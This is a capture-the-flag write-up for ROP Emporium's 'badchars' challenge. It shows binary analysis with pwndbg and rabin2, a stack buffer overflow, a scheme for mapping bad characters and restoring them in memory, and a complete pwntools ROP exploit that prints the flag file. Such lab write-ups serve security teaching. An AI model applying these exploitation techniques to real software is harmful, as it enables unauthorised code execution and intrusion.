# ROP - Badchars


## Description 

CTF took from https://ropemporium.com/challenge/badchars.html.

The aim of this challenge is similar to the previous one ([write4](https://w-disaster.github.io/write4/)): store a string into memory and call `print_file` to show then content of `flag.txt`. The difference is that *badchars* are applied to every character passed as input, so the string might be handled in some way to change its content after storing it in memory.

More information are shown in the linked website.

## Analyze the binary

Download the challenge:
```sh
$ curl --output badchars.zip https://ropemporium.com/binary/badchars.zip
$ unzip badchars.zip && rm badchars.zip
```
List imports:
```bash
$ rabin2 -i badchars 
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400500 GLOBAL FUNC       pwnme
2   0x00000000 GLOBAL FUNC       __libc_start_main
3   0x00000000 WEAK   NOTYPE     __gmon_start__
4   0x00400510 GLOBAL FUNC       print_file
```

First, let's see the function written by the programmer:
```sh
$ rabin2 -qs badchars| grep -ve imp -e ' 0 '
0x00601038 1 completed.7698
0x00400617 17 usefulFunction
0x004006b0 2 __libc_csu_fini
0x004006c0 4 _IO_stdin_used
0x00400640 101 __libc_csu_init
0x00400550 2 _dl_relocate_static_pie
0x00400520 43 _start
0x00400607 16 main
```

Enter to pwndbg (```gdb-pwndbg badchars```) and disassemble ```pwnme``` and ```usefulFunction``` since we're interested in them. `pwnme` is an imported function so once the gdb is started, insert a breakpoint in the main function and run.

```asm
pwndbg> b main
Breakpoint 1 at 0x40060b
pwndbg> r
Starting program: /home/luca/Desktop/w-disaster/rop-emporium/badchars/badchars 

Breakpoint 1, 0x000000000040060b in main ()
...

pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x00007ffff7dc58fa <+0>:     push   rbp
   0x00007ffff7dc58fb <+1>:     mov    rbp,rsp
   0x00007ffff7dc58fe <+4>:     sub    rsp,0x40
   ...
   0x00007ffff7dc593b <+65>:    lea    rax,[rbp-0x40]
   0x00007ffff7dc593f <+69>:    add    rax,0x20
   0x00007ffff7dc5943 <+73>:    mov    edx,0x20
   0x00007ffff7dc5948 <+78>:    mov    esi,0x0
   0x00007ffff7dc594d <+83>:    mov    rdi,rax
   0x00007ffff7dc5950 <+86>:    call   0x7ffff7dc57b0 <memset@plt>
   ...
   0x00007ffff7dc5972 <+120>:   lea    rax,[rbp-0x40]
   0x00007ffff7dc5976 <+124>:   add    rax,0x20
   0x00007ffff7dc597a <+128>:   mov    edx,0x200
   0x00007ffff7dc597f <+133>:   mov    rsi,rax
   0x00007ffff7dc5982 <+136>:   mov    edi,0x0
   0x00007ffff7dc5987 <+141>:   call   0x7ffff7dc57c0 <read@plt>
   ...
   0x00007ffff7dc5a04 <+266>:   nop
   0x00007ffff7dc5a05 <+267>:   leave  
   0x00007ffff7dc5a06 <+268>:   ret    
End of assembler dump.
```
Note that:
- There's a ```rax,[rbp-0x40]; add rax,0x20``` instruction before the memset and read operation, so the address where the input string will be placed is `[rbp-0x20]`.
- No bound checking is done for the input string, so we can override the `rsp` register to modify as we want the flow of execution of this program.
- The `leave` instruction does `mov rsp, rbp; pop rbp` and the `ret` a `add rsp, 0x8`.

Given this assumptions, the payload must contain a padding of length `0x20 + 0x8` bytes and after that the sequence of the desired gadgets.

Now, let's disassble `usefulFunction`:
```asm
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:     push   rbp
   0x0000000000400618 <+1>:     mov    rbp,rsp
   0x000000000040061b <+4>:     mov    edi,0x4006c4
   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:    nop
   0x0000000000400626 <+15>:    pop    rbp
   0x0000000000400627 <+16>:    ret    
End of assembler dump.
```

`usefulFunction` inform us that `print_file` reads the string in the address pointed by `edi` register.
Furthermore, we'll need the `call` instruction address in the ROP chain to finally invoke that function.

At this point where it's known the payload's padding and the register that we must set before calling `print_file`, it's necessary to understand how to place the string into memory.

```sh
$ readelf --sections badchars 
There are 29 section headers, starting at offset 0x1980:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
   ...
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  ...
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```
`.data` is writable so let's take its address (`0000000000601028`).


## Deal with badchars

Run the executable to inspect the badchars:
```sh
$ ./badchars 
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> 
```

The `usefulGadgets`'s which ROP Emporium gives us will come in handy, so disasseble it.

```asm
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     xor    BYTE PTR [r15],r14b
   0x000000000040062b <+3>:     ret    
   0x000000000040062c <+4>:     add    BYTE PTR [r15],r14b
   0x000000000040062f <+7>:     ret    
   0x0000000000400630 <+8>:     sub    BYTE PTR [r15],r14b
   0x0000000000400633 <+11>:    ret    
   0x0000000000400634 <+12>:    mov    QWORD PTR [r13+0x0],r12
   0x0000000000400638 <+16>:    ret    
   0x0000000000400639 <+17>:    nop    DWORD PTR [rax+0x0]
End of assembler dump.
```

Badchars are applied not only to parameters but addresses too. For the latter make use of `pwntools` which filters out gadgets that contains badchars, passing them as parameters in the `ROP` object.

For the former I build a mapping and an unmapping function. 
- The mapping function maps a badchar to an available char and is applied when a string is inserted into the ROP chain.
- In the other hand, the `unmap` function exploits gadgets to change the string once is in memory, restoring its original content. To do that, disasseble the `usefulGadgets` function and use this gadget:
`sub BYTE PTR [r15],r14b; ret`. The unmapping is done by substracting the decimal ASCII value of the mapped char with the original one.

Now we have all the elements to build a rop chain.
Here's how the stack should be structured before the ret instruction in the ```pwnme``` function:

```asm
|     "A" * offset      |
| &pop_r12_r13_r14_r15  |
|      "flbh/tyt"       |
|       str_addr        |
|    "JUNKJUNK" * 2     |
|       0x400634        |
|                       |
|     &pop_r14_r15      |
|         0x1           |
|    str_addr + 0x2     |
|       0x400630        |
|    rop.pop_r14_r15    |
|         0x1           |
|    str_addr + 0x3     |
|       0x400630        |
|    rop.pop_r14_r15    |
|         0x1           |
|    str_addr + 0x4     |
|       0x400630        |
|    rop.pop_r14_r15    |
|         0x1           |
|   str_addr + 0x6      |
|      0x400630         |
|                       |
|       &pop_rdi        |
|       str_addr        |   
|      &print_file      |
|         ...           |
-------------------------
         STACK
```

The first part contains the padding (`"A" * 40`) and stores the mapped string into memory (in the `.data` section described before), loading the values in the available registers and finally calling a gadgets shown in `usefulGadgets` (`mov QWORD PTR [r13+0x0],r12`). 

The middle part changes the string (`flag.txt`) char by char (the mapping is shown in the exploit).

At the end the address of the string is put into `rdi` and the `print_file` function is called.

## Exploit

```python
from pwn import *

"""
    This function takes as input a string stored in str_addr
    and eventually changes its content by unmapping the mapped badchars,
    if it contains them.
    The unmapping is done by substracting the decimal ASCII value of the
    mapped char with the original one using this specific gadget:
    sub BYTE PTR [r15],r14b; ret.
"""
def unmap(rop: ROP, badchars, badchars_mapping, string, str_addr):
    offsets = [string.index(c) for c in string if c in badchars] 
    for offset in offsets:
        # pop r14, pop r15
        rop.raw(rop.r14_r15)       
        idx = badchars.index(string[offset])
        diff = ord(badchars_mapping[idx]) - ord(badchars[idx]) 
        rop.raw(p64(diff))
        rop.raw(p64(str_addr + offset))
        # sub BYTE PTR [r15],r14b; ret 
        rop.raw(p64(0x400630))

""" 
    This function takes as input the filename of the executable and returns
    a ROP chain.
"""
def build_rop_chain(binary_name):   
    """ 
    - Define a mapping for each char in badchars. 
    - Once the string is the memory, exploit gadgets to change it
        to the original one.
    - Since in this specific executable each badchar's successor (with the
        respect of the ASCII table) isn't a badchar, we define this mapping:
        x --> y, g --> h, a --> b, . --> /
    """
    badchars = ['x', 'g', 'a', '.'] 
    badchars_mapping = [chr(ord(c) + 1) for c in badchars]

    # ELF and ROP objects
    elf = ELF(binary_name) 
    rop = ROP(elf, badchars=[hex(ord(b)) for b in badchars])

    # .data section available address to store the desired string
    str_addr = 0x60102f
    # offset 
    offset = 40
    filename = "flag.txt"
   
    # Payload
    rop.raw(b"A" * offset)
    
    # pop r12; pop r13; pop r14; pop r15; ret
    rop.raw(rop.r12_r13_r14_r15)
    rop.raw(bytes("".join([f if f not in badchars 
        else badchars_mapping[badchars.index(f)] for f in filename]), 'ascii'))
    rop.raw(p64(str_addr))
    rop.raw(b"JUNKJUNK" * 2)

    # mov string into address
    rop.raw(p64(0x400634))

    # unmap
    unmap(rop, badchars, badchars_mapping, filename, str_addr)
    
    # Store on rdi register the address of the string
    rop.raw(rop.rdi)
    rop.raw(p64(str_addr))
    rop.raw(elf.symbols.print_file)
    return rop.chain()


if __name__ == '__main__':
    filename = "./badchars"
    context.arch = "amd64"

    # ROP chain
    rop_chain = build_rop_chain(filename)
    
    # Run process
    p = process(filename)
    p.recvuntil(b"\n> ")
    p.sendline(rop_chain)  
    print(p.recvall())
```
```sh
$ python3 exploit.py 
[*] '/home/luca/Desktop/w-disaster/rop-emporium/badchars/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './badchars'
[+] Starting local process './badchars': pid 13699
[+] Receiving all data: Done (44B)
[*] Process './badchars' stopped with exit code -11 (SIGSEGV) (pid 13699)
b'Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

